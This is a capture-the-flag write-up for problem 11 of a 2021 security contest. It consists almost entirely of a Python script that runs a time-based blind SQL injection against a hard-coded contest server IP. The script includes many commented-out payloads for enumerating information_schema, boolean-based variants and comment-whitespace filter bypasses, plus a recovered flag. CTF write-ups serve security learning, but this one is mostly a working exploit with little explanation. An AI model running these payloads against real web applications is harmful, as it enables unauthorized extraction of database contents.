# 2021-金砖系统安全-writeup

## 第11题

SQL时间盲注入：

```python
import requests
from time import sleep
url="http://106.14.91.65:8003/index.php"


def charToHex(string):
    res = "0x"
    for i in string:
        res +=str(hex(ord(i))).replace("0x","")
    return res
flag='flag{0ca75e4b19583a18e6a0e6517a8b53df}'
"ABCDEFGHIJKLMNOPQRSTUVWXYZ"
for i in range(1,100):
    for j in "{}0123456789abcdefghijklmnopqrstuvwxyz,-_":
    #for j in "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ{},-_":

        #payload="' or if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),{},1))<{},sleep(0.02),1)#".format(i,j)
        #payload="' or if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name='flag233333'),{},1))<{},sleep(0.02),1)#".format(i,j)
        #payload="' or if(ascii(substr((select group_concat(flagass233) from flag233333),{},1))<{},sleep(0.02),1)#".format(i,j)
        #payload="-1'||if(ascii(substr(database(),{},1))<{},1=1,1=2)#".format(i,j)
        #payload="-1'||if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),{},1))<{},1=1,1=2)#".format(i,j)
        #payload="-1'||if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name='words'),{},1))<{},1=1,1=2)#".format(i,j)
        #payload="-1'||if(ascii(substr((select group_concat(flag) from `1919810931114514`),{},1))<{},1=1,1=2)#".format(i,j)
        #payload = "/**/||case/**/when/**/((select/**/group_concat(table_name)/**/from/**/information_schema.columns/**/where/**/table_name/**/like/**/0x25666c616725)like/**/{})/**/then/**/sleep(0.4)/**/else/**/0.4/**/end#".format(charToHex(flag+j+"%"))
        #payload = "/**/||case/**/when/**/((select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name/**/like/**/0x61666c414761)like/**/binary/**/{})/**/then/**/sleep(0.4)/**/else/**/0.4/**/end#".format(charToHex(flag+j+"%"))
        payload = "/**/||case/**/when/**/((select/**/group_concat(Value)/**/from/**/aflaga)like/**/binary/**/{})/**/then/**/sleep(0.4)/**/else/**/0.5/**/end#".format(charToHex(flag+j+"%"))

        #print(payload)
        params = {
            "a":"\\",
            "b":payload
        }
        try:
            r = requests.get(url=url,params=params,timeout=1.2)
        except:
            flag += j
            print(flag)
        sleep(0.3)
"admIN"
"Value" "aflaga"
```

